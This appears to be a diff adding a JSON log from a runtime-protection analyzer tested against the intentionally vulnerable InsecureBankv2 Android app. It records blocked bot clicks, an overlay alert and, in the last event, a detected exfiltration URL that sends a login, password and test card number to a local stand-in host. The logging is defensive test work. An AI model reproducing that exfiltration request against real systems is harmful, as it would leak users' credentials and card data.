@@ -1,0 +1,126 @@
+{
+  "report_meta": {
+    "generated_at": "2026-06-13T16:12:36.146664",
+    "tool": "RASP Dynamic Analyzer v2.0",
+    "target_app": "com.android.insecurebankv2",
+    "session_id": "run_001_20260613_161213",
+    "scenario": "all",
+    "total_events": 19
+  },
+  "events": [
+    {
+      "timestamp": "2026-06-13T16:12:24.102226",
+      "level": "info",
+      "threat": "SYSTEM",
+      "details": "Hook #1+#2b (ATS / View.dispatchTouchEvent + FLAG_WINDOW_IS_OBSCURED) -- OK"
+    },
+    {
+      "timestamp": "2026-06-13T16:12:24.106301",
+      "level": "info",
+      "threat": "SYSTEM",
+      "details": "Hook #2 (Overlay / onWindowFocusChanged) -- OK"
+    },
+    {
+      "timestamp": "2026-06-13T16:12:24.113912",
+      "level": "info",
+      "threat": "SYSTEM",
+      "details": "Hook #3a (Network / DefaultHttpClient.execute) -- OK"
+    },
+    {
+      "timestamp": "2026-06-13T16:12:24.120484",
+      "level": "info",
+      "threat": "SYSTEM",
+      "details": "Hook #3b (Network / URL.$init) -- OK"
+    },
+    {
+      "timestamp": "2026-06-13T16:12:24.121697",
+      "level": "info",
+      "threat": "SYSTEM",
+      "details": "=== All hooks active. Monitoring started. ==="
+    },
+    {
+      "timestamp": "2026-06-13T16:12:25.515775",
+      "level": "critical",
+      "threat": "ATS Bot Activity",
+      "details": "Programmatic click BLOCKED! Source: 4098, DeviceID: -1"
+    },
+    {
+      "timestamp": "2026-06-13T16:12:25.518656",
+      "level": "critical",
+      "threat": "ATS Bot Activity",
+      "details": "Programmatic click BLOCKED! Source: 4098, DeviceID: -1"
+    },
+    {
+      "timestamp": "2026-06-13T16:12:26.074497",
+      "level": "critical",
+      "threat": "ATS Bot Activity",
+      "details": "Programmatic click BLOCKED! Source: 4098, DeviceID: -1"
+    },
+    {
+      "timestamp": "2026-06-13T16:12:26.076549",
+      "level": "critical",
+      "threat": "ATS Bot Activity",
+      "details": "Programmatic click BLOCKED! Source: 4098, DeviceID: -1"
+    },
+    {
+      "timestamp": "2026-06-13T16:12:26.633141",
+      "level": "critical",
+      "threat": "ATS Bot Activity",
+      "details": "Programmatic click BLOCKED! Source: 4098, DeviceID: -1"
+    },
+    {
+      "timestamp": "2026-06-13T16:12:26.633920",
+      "level": "critical",
+      "threat": "ATS Bot Activity",
+      "details": "Programmatic click BLOCKED! Source: 4098, DeviceID: -1"
+    },
+    {
+      "timestamp": "2026-06-13T16:12:27.203315",
+      "level": "critical",
+      "threat": "ATS Bot Activity",
+      "details": "Programmatic click BLOCKED! Source: 4098, DeviceID: -1"
+    },
+    {
+      "timestamp": "2026-06-13T16:12:27.204297",
+      "level": "critical",
+      "threat": "ATS Bot Activity",
+      "details": "Programmatic click BLOCKED! Source: 4098, DeviceID: -1"
+    },
+    {
+      "timestamp": "2026-06-13T16:12:27.762497",
+      "level": "critical",
+      "threat": "ATS Bot Activity",
+      "details": "Programmatic click BLOCKED! Source: 4098, DeviceID: -1"
+    },
+    {
+      "timestamp": "2026-06-13T16:12:27.764169",
+      "level": "critical",
+      "threat": "ATS Bot Activity",
+      "details": "Programmatic click BLOCKED! Source: 4098, DeviceID: -1"
+    },
+    {
+      "timestamp": "2026-06-13T16:12:28.321452",
+      "level": "critical",
+      "threat": "ATS Bot Activity",
+      "details": "Programmatic click BLOCKED! Source: 4098, DeviceID: -1"
+    },
+    {
+      "timestamp": "2026-06-13T16:12:28.322005",
+      "level": "critical",
+      "threat": "ATS Bot Activity",
+      "details": "Programmatic click BLOCKED! Source: 4098, DeviceID: -1"
+    },
+    {
+      "timestamp": "2026-06-13T16:12:28.959031",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-13T16:12:31.172322",
+      "level": "critical",
+      "threat": "C2 Exfiltration",
+      "details": "SUSPICIOUS URL inside process: http://10.0.2.2:9999/exfiltrate?login=jack&pass=Jack%40123&card=4111111111111111 [NOT a bank server!]"
+    }
+  ]
+}
